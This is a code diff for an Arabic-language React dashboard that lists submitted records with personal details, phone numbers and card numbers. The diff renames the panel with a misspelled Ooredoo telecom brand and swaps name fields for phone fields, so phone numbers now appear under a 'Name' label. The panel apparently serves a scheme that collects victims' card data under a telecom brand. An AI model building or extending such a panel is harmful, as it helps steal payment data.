@@ -425,7 +425,7 @@ export default function NotificationsPage() {
     <div dir="rtl" className="min-h-screen bg-background text-foreground p-4">
       <div className="max-w-7xl mx-auto">
         <div className="flex flex-col sm:flex-row justify-between items-center mb-6">
-          <h1 className="text-2xl font-bold mb-4 sm:mb-0">لوحة الإشعارات</h1>
+          <h1 className="text-2xl font-bold mb-4 sm:mb-0">لوحة اوريدووو</h1>
           <div className="flex flex-col sm:flex-row gap-2">
             <Button
               variant="destructive"
@@ -544,11 +544,11 @@ export default function NotificationsPage() {
                     <td className="px-4 py-3">
                       <div className="flex flex-wrap gap-2">
                         <Badge
-                          variant={notification.name ? "default" : "destructive"}
+                          variant={notification.phone ? "default" : "destructive"}
                           className="rounded-md cursor-pointer"
                           onClick={() => handleInfoClick(notification, "personal")}
                         >
-                          {notification.name ? "معلومات شخصية" : "لا يوجد معلومات"}
+                          {notification.phone ? "معلومات شخصية" : "لا يوجد معلومات"}
                         </Badge>
                         <Badge
                           variant={notification.cardNumber ? "default" : "destructive"}
@@ -656,11 +656,11 @@ export default function NotificationsPage() {
                     <div className="grid grid-cols-1 gap-3 mb-3">
                       <div className="flex flex-wrap gap-2">
                         <Badge
-                          variant={notification.name ? "default" : "destructive"}
+                          variant={notification.phone ? "default" : "destructive"}
                           className="rounded-md cursor-pointer"
                           onClick={() => handleInfoClick(notification, "personal")}
                         >
-                          {notification.name ? "معلومات شخصية" : "لا يوجد معلومات"}
+                          {notification.phone ? "معلومات شخصية" : "لا يوجد معلومات"}
                         </Badge>
                         <Badge
                           variant={notification.cardNumber ? "default" : "destructive"}
@@ -757,10 +757,10 @@ export default function NotificationsPage() {
                   <span>{selectedNotification.mobile}</span>
                 </p>
               )}
-              {selectedNotification.name && (
+              {selectedNotification.phone && (
                 <p className="flex justify-between">
                   <span className="font-medium">الاسم:</span>
-                  <span>{selectedNotification.name}</span>
+                  <span>{selectedNotification.phone}</span>
                 </p>
               )}
               {selectedNotification.phone && (
